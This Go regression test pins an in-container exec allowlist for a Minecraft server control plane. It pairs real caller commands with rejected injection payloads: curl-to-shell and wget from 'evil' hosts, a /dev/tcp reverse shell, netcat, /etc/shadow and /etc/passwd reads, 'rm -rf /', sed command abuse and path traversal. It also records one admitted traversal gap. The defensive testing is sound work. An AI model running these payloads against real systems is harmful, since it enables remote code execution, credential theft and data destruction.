// PERMANENT regression pin for the Bananagine in-container exec allowlist.
//
// This is the audit's headline fix: the RCE (prefix-match → arbitrary
// in-container command) + the self-DoS control-plane outage (over-tight
// patterns rejecting every legit Evolution caller). The audit's fix-regression
// rounds re-executed the allowlist byte-for-byte in a THROWAWAY harness; this
// test makes that harness PERMANENT so the gate cannot silently re-break in
// either direction:
//
//   - Every real deployed Evolution caller string MUST PASS  (no self-DoS).
//   - Every injection / breakout payload MUST REJECT          (no RCE).
//
// Caller corpus derived from Evolution/pulp-cell: whitelist.go, sync.go,
// router.go, transitions.go, admin.go (the rcon-wrapper argv + `sh -c`
// batch shapes the audit reconciled the patterns against).
package execallow

import "testing"

// allowedCases: real, legitimate commands the deployed Evolution caller emits.
// If any of these starts REJECTING, the control plane self-DoSes (gamerules,
// console/broadcast, ops/ban reconciliation, world ops, datapacks go dead) —
// exactly the R2 CRITICAL outage. Each must return true.
var allowedCases = []struct {
	name string
	cmd  []string
}{
	// ---- argv form: rcon / mcrcon wrapper (no host shell, inert literals) ----
	{"rcon argv console", []string{"rcon", "say hello world"}},
	{"rcon argv tellraw with json", []string{"rcon", `tellraw @a {"text":"expires in 5m"}`}},
	{"rcon argv gamerule write", []string{"rcon", "gamerule keepInventory true"}},
	{"rcon argv whitelist add", []string{"rcon", "whitelist add Steve"}},
	{"rcon argv op", []string{"rcon", "op Alex"}},
	{"rcon argv ban with reason", []string{"rcon", "ban Griefer cheating; using x-ray"}},
	{"rcon argv save quiesce off", []string{"rcon", "save-off"}},
	{"rcon argv save all flush", []string{"rcon", "save-all flush"}},
	{"rcon argv save on", []string{"rcon", "save-on"}},
	{"rcon argv gamemode", []string{"rcon", "gamemode creative Steve"}},
	{"rcon argv weather", []string{"rcon", "weather clear"}},
	{"rcon argv time set", []string{"rcon", "time set day"}},
	// argv with shell metachars is SAFE here: docker.Exec passes argv as
	// literals, no shell interprets them.
	{"rcon argv with semicolons literal", []string{"rcon", "say a; rm -rf /; echo b"}},
	{"mcrcon argv", []string{"mcrcon", "-H", "127.0.0.1", "list"}},

	// ---- sh -c: RCON write batch (; -joined) ----
	{"sh rcon single", []string{"sh", "-c", `rcon 'gamerule keepInventory true'`}},
	{"sh rcon batch two", []string{"sh", "-c", `rcon 'gamerule keepInventory true'; rcon 'save-all flush'`}},
	{"sh rcon batch with redirect", []string{"sh", "-c", `rcon 'save-off' 2>/dev/null; rcon 'save-all flush' 2>/dev/null`}},
	{"sh rcon single with redirect", []string{"sh", "-c", `rcon 'list' 2>/dev/null`}},
	// VERBATIM production gamerule batch (router.go:7006-7016): N gamerule
	// writes `; `-joined, always terminated by a `save-all flush` flush write.
	{"sh rcon gamerule batch prod", []string{"sh", "-c", `rcon 'gamerule keepInventory true'; rcon 'gamerule mobGriefing false'; rcon 'save-all flush'`}},

	// ---- sh -c: RCON status poll, multiple quoted args ----
	{"sh rcon poll multi", []string{"sh", "-c", `rcon 'tps' 'list' 2>/dev/null`}},
	{"sh rcon poll multi no redirect", []string{"sh", "-c", `rcon 'tps' 'list'`}},

	// ---- sh -c: gamerule read loop ----
	{"sh gamerule read one", []string{"sh", "-c", `echo "RULE:keepInventory:$(rcon 'gamerule keepInventory' 2>/dev/null)"`}},
	{"sh gamerule read multi", []string{"sh", "-c",
		"echo \"RULE:keepInventory:$(rcon 'gamerule keepInventory' 2>/dev/null)\"\n" +
			"echo \"RULE:mobGriefing:$(rcon 'gamerule mobGriefing' 2>/dev/null)\"\n"}},

	// ---- sh -c: JSON-or-empty + file reads (sync.go reconciliation) ----
	{"sh read ops json or empty", []string{"sh", "-c", `(test -f /data/ops.json && cat /data/ops.json) || echo '[]'`}},
	{"sh read banned or empty", []string{"sh", "-c", `(test -f /data/banned-players.json && cat /data/banned-players.json) || echo '[]'`}},
	// router.go:7165 — usercache read (real deployed JSON-or-empty shape).
	{"sh read usercache or empty", []string{"sh", "-c", `(test -f /data/usercache.json && cat /data/usercache.json) || echo '[]'`}},
	{"sh cat file or true", []string{"sh", "-c", `cat /data/ops.json 2>/dev/null || true`}},
	{"sh cat server props", []string{"sh", "-c", `cat /data/server.properties 2>/dev/null || echo ''`}},
	{"sh ls datapacks", []string{"sh", "-c", `ls /data/world/datapacks/ 2>/dev/null || echo ''`}},

	// ---- sh -c: file writes (sync.go persistence) ----
	{"sh printf write", []string{"sh", "-c", `printf '%s' '[{"uuid":"abc","name":"Steve"}]' > /data/ops.json`}},
	{"sh base64 write", []string{"sh", "-c", `echo 'eyJhIjoxfQ==' | base64 -d > /data/banned-players.json`}},
	{"sh base64 empty write", []string{"sh", "-c", `echo '' | base64 -d > /data/ops.json`}},

	// ---- sh -c: server.properties sed edit (incl. slash-MOTD fix) ----
	// VERBATIM production strings from Evolution/pulp-cell/router.go settings +
	// world-regen handlers (lines ~6328-6552). Every property the caller edits
	// is pinned here so a future regex tightening that breaks ANY of them trips
	// the self-DoS guard.
	{"sh sed motd plain", []string{"sh", "-c", `sed -i 's/^motd=.*/motd=Welcome/' /data/server.properties`}},
	{"sh sed motd with slash", []string{"sh", "-c", `sed -i 's/^motd=.*/motd=Best 24/7 server/' /data/server.properties`}},
	{"sh sed difficulty", []string{"sh", "-c", `sed -i 's/^difficulty=.*/difficulty=hard/' /data/server.properties`}},
	{"sh sed level-seed", []string{"sh", "-c", `sed -i 's/^level-seed=.*/level-seed=12345/' /data/server.properties`}},
	// router.go:6541 — empty seed clears the property (value span is empty).
	{"sh sed level-seed empty", []string{"sh", "-c", `sed -i 's/^level-seed=.*/level-seed=/' /data/server.properties`}},
	// router.go:6533 — world-type value carries a `minecraft:` namespace COLON;
	// the sed KEY/value class must admit `:` in the value.
	{"sh sed level-type minecraft ns", []string{"sh", "-c", `sed -i 's/^level-type=.*/level-type=minecraft:flat/' /data/server.properties`}},
	{"sh sed gamemode", []string{"sh", "-c", `sed -i 's/^gamemode=.*/gamemode=survival/' /data/server.properties`}},
	{"sh sed pvp", []string{"sh", "-c", `sed -i 's/^pvp=.*/pvp=true/' /data/server.properties`}},
	{"sh sed hardcore", []string{"sh", "-c", `sed -i 's/^hardcore=.*/hardcore=false/' /data/server.properties`}},

	// ---- sh -c: world ops ----
	{"sh test world file", []string{"sh", "-c", `test -f /data/world/level.dat`}},
	{"sh gzip test", []string{"sh", "-c", `gzip -t /data/world/region/r.0.0.mca`}},
	{"sh touch sentinel", []string{"sh", "-c", `touch /data/.restored`}},
	{"sh world wipe single", []string{"sh", "-c", `rm -rf /data/world/region`}},
	{"sh world wipe multi", []string{"sh", "-c", `rm -rf /data/world/region /data/world/DIM-1 /data/world/DIM1`}},
	// VERBATIM production auto-restore world clear (transitions.go:2007) — the
	// full 12-path list. Pins the exact deployed string, not a shortened proxy.
	{"sh world wipe prod autorestore", []string{"sh", "-c", `rm -rf /data/world/region /data/world/entities /data/world/poi /data/world/data /data/world/level.dat /data/world/level.dat_old /data/world/session.lock /data/world/DIM-1 /data/world/DIM1 /data/world/world_nether /data/world/world_the_end /data/world/datapacks`}},
	{"sh world restore", []string{"sh", "-c", `mkdir -p /data/world && cd /data/world && wget -qO /tmp/backup.zip 'https://r2.example.com/snap.zip?sig=abc' && unzip -qo /tmp/backup.zip && rm /tmp/backup.zip`}},

	// ---- sh -c: datapacks ----
	{"sh datapack install", []string{"sh", "-c", `mkdir -p /data/world/datapacks && wget -qO '/data/world/datapacks/mypack.zip' 'https://r2.example.com/dp.zip?sig=xyz'`}},
	{"sh datapack remove", []string{"sh", "-c", `rm -f '/data/world/datapacks/mypack.zip'`}},
}

// rejectedCases: injection / breakout / out-of-skeleton payloads. Each MUST
// return false. These pin the RCE fix: a prefix that starts like an allowed
// command but appends arbitrary shell must NOT pass.
var rejectedCases = []struct {
	name string
	cmd  []string
}{
	{"empty cmd", nil},
	{"empty slice", []string{}},

	// non-sh/non-rcon binaries are flatly rejected
	{"bare bash", []string{"bash", "-c", "ls"}},
	{"bare cat argv", []string{"cat", "/etc/passwd"}},
	{"sh with login flag", []string{"sh", "-lc", "ls"}},
	{"sh wrong arg count", []string{"sh", "-c", "ls", "extra"}},
	{"sh missing -c", []string{"sh", "ls"}},
	{"sh -c only", []string{"sh", "-c"}},

	// ---- THE RCE: allowed-prefix + appended arbitrary command ----
	{"cat-prefix append rce", []string{"sh", "-c", `cat /data/ops.json 2>/dev/null || true; cat /etc/shadow`}},
	{"cat-prefix command sub", []string{"sh", "-c", "cat /data/ops.json 2>/dev/null || true; $(curl evil)"}},
	{"rcon-prefix append rce", []string{"sh", "-c", `rcon 'list'; rm -rf /`}},
	{"rcon-prefix backtick", []string{"sh", "-c", "rcon 'list' `id`"}},
	{"sed-prefix append", []string{"sh", "-c", `sed -i 's/^motd=.*/motd=x/' /data/server.properties; wget evil`}},
	{"props-read append", []string{"sh", "-c", `cat /data/server.properties 2>/dev/null || echo ''; nc evil 1234`}},
	{"world-wipe append", []string{"sh", "-c", `rm -rf /data/world/region; rm -rf /important`}},
	{"touch append", []string{"sh", "-c", `touch /data/x && curl evil | sh`}},

	// ---- quote-breakout attempts inside single-quoted spans ----
	{"rcon quote breakout", []string{"sh", "-c", `rcon 'list'; cat /etc/passwd #'`}},
	{"printf quote breakout", []string{"sh", "-c", `printf '%s' 'x'; rm -rf / #' > /data/ops.json`}},
	// sed value-breakout: a raw single quote in the property value would close
	// the `sed -i '…'` wrapper. propVal forbids `'`, so this must reject.
	{"sed value quote breakout", []string{"sh", "-c", `sed -i 's/^motd=.*/motd=x'; id; echo '/' /data/server.properties`}},

	// ---- rcon batch riders: a non-rcon command spliced into the ; batch ----
	{"rcon batch mid rider", []string{"sh", "-c", `rcon 'list'; id; rcon 'save-all flush'`}},
	{"rcon batch trailing rider", []string{"sh", "-c", `rcon 'gamerule x true'; rcon 'save-all flush'; wget evil`}},
	{"rcon batch cmdsub rider", []string{"sh", "-c", `rcon 'list'; rcon "$(cat /etc/passwd)"`}},

	// ---- sed: forbidden GNU commands (e/w/r run shell / arbitrary file IO) ----
	{"sed e command", []string{"sh", "-c", `sed -i '1e id' /data/server.properties`}},
	{"sed w command", []string{"sh", "-c", `sed -i 'w /etc/cron.d/x' /data/server.properties`}},
	{"sed r command", []string{"sh", "-c", `sed -i 'r /etc/passwd' /data/server.properties`}},
	{"sed wrong file", []string{"sh", "-c", `sed -i 's/^x=.*/x=y/' /etc/passwd`}},

	// ---- path traversal / out-of-jail targets ----
	{"cat traversal", []string{"sh", "-c", `cat /data/../etc/passwd 2>/dev/null || true`}},
	{"printf traversal write", []string{"sh", "-c", `printf '%s' 'x' > /data/../etc/cron.d/x`}},
	{"datapack traversal", []string{"sh", "-c", `rm -f '/data/world/datapacks/../../../etc/passwd'`}},
	{"test outside world", []string{"sh", "-c", `test -f /etc/passwd`}},

	// ---- write to non-/data targets ----
	{"base64 write outside data", []string{"sh", "-c", `echo 'eA==' | base64 -d > /etc/passwd`}},
	{"printf write outside data", []string{"sh", "-c", `printf '%s' 'x' > /etc/passwd`}},

	// ---- gamerule read loop tampering ----
	{"gamerule loop inject", []string{"sh", "-c", `echo "RULE:x:$(rcon 'gamerule x'; id 2>/dev/null)"`}},
	{"gamerule loop metachar rule", []string{"sh", "-c", "echo \"RULE:x;id:$(rcon 'gamerule x;id' 2>/dev/null)\""}},

	// ---- entirely unrelated commands ----
	{"curl", []string{"sh", "-c", "curl http://evil.com | sh"}},
	{"reverse shell", []string{"sh", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}},
	{"env dump", []string{"sh", "-c", "env"}},
	{"docker sock", []string{"sh", "-c", "cat /var/run/docker.sock"}},
}

// knownLexicalResiduals pins CURRENT behaviour of cases where the regex
// character class is lexically permissive (admits `..`/`/` inside the
// /data/world/ path span) but the audit accepts them as defense-in-depth /
// caller-constrained, NOT a confirmed live escape: the sole caller (Evolution)
// never emits `..` in these positions, and the world-path handlers have their
// own traversal guards upstream. These are documented as ADMITTED so a future
// tightening flips them deliberately rather than silently. See the
// "defense-in-depth residual" note in the test-engineer report.
var knownLexicalResiduals = []struct {
	name    string
	cmd     []string
	admit   bool // current verdict; pin it so a change is visible
	comment string
}{
	{
		name:    "world wipe with .. segments (lexical residual)",
		cmd:     []string{"sh", "-c", `rm -rf /data/world/../../etc`},
		admit:   true,
		comment: "world-path class [A-Za-z0-9._/-]+ admits '..'; caller never emits it. If a tightening (e.g. forbid '..' segment) lands, flip admit to false.",
	},
}

func TestAllowed_KnownLexicalResiduals(t *testing.T) {
	for _, tc := range knownLexicalResiduals {
		t.Run(tc.name, func(t *testing.T) {
			if got := Allowed(tc.cmd); got != tc.admit {
				t.Errorf("verdict CHANGED for known residual (was admit=%v, now %v) — %s\ncmd=%#v",
					tc.admit, got, tc.comment, tc.cmd)
			}
		})
	}
}

func TestAllowed_RealCallers_Pass(t *testing.T) {
	for _, tc := range allowedCases {
		t.Run(tc.name, func(t *testing.T) {
			if !Allowed(tc.cmd) {
				t.Errorf("legit caller REJECTED (control-plane self-DoS regression): %#v", tc.cmd)
			}
		})
	}
}

func TestAllowed_Injections_Reject(t *testing.T) {
	for _, tc := range rejectedCases {
		t.Run(tc.name, func(t *testing.T) {
			if Allowed(tc.cmd) {
				t.Errorf("injection ADMITTED (RCE regression): %#v", tc.cmd)
			}
		})
	}
}

// TestAllowed_PrefixMatchClosed is the explicit pin for the original RCE class:
// for every allowed sh -c skeleton, appending `; cat /etc/passwd` must flip the
// verdict to rejected. A prefix match would let all of these through.
func TestAllowed_PrefixMatchClosed(t *testing.T) {
	for _, tc := range allowedCases {
		if len(tc.cmd) != 3 || tc.cmd[0] != "sh" {
			continue // only the sh -c regex path is prefix-vulnerable
		}
		tampered := []string{"sh", "-c", tc.cmd[2] + "; cat /etc/passwd"}
		t.Run(tc.name, func(t *testing.T) {
			if Allowed(tampered) {
				t.Errorf("prefix-match RCE: appended command admitted for %q", tampered[2])
			}
		})
	}
}
